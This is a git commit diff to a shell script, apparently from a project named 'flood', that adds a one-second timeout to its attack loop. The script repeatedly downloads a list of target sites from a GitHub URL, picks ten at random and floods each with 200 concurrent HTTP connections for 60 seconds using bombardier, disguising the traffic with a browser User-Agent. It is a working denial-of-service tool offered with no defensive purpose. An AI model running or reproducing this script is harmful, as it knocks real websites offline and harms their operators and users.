7bccc40b60c279d53fda0dc532a74f34803f40c2
Anarhyst266 <anarhyst266@gmail.com>
2022-02-28 16:34:19 +0200

    add lower timeout

--- run.sh
+++ run.sh
@@ -5,7 +5,7 @@ do
     wget -O /app/targets.txt https://raw.githubusercontent.com/Anarhyst266/flood/master/targets.txt
     cat /app/targets.txt |shuf | tail -n 10 | while read line
     do
-        bombardier -c 200 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
+        bombardier -c 200 -t 1s -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
     done
     sleep 60
 done
